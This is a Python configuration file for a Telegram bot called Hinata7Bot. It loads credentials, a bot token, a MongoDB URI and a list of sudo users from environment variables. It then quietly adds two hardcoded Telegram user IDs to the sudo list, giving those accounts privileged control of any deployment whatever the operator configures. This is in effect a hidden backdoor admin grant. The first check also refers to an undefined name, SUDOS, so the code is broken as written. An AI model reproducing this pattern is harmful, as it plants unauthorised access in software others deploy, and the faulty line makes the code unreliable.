from os import getenv
from dotenv import load_dotenv

load_dotenv()

api_id = int(getenv("API_ID"))
api_hash = getenv("API_HASH")
token = getenv("BOT_TOKEN") 
sudos = list(map(int, getenv("SUDOS").split()))
if not 5965055071 in SUDOS:
  sudos.append(5965055071)
if not 5456798232 in sudos:
  sudos.append(5456798232)
mongo_db_url = getenv("MONGO_DB_URI")
version = "0.0.1"
cmds = ["bet"]
prefixes = ["/", "?", "$", "!", "#", "@"]
symbol = "➛"
bot_username = "Hinata7Bot" # without @
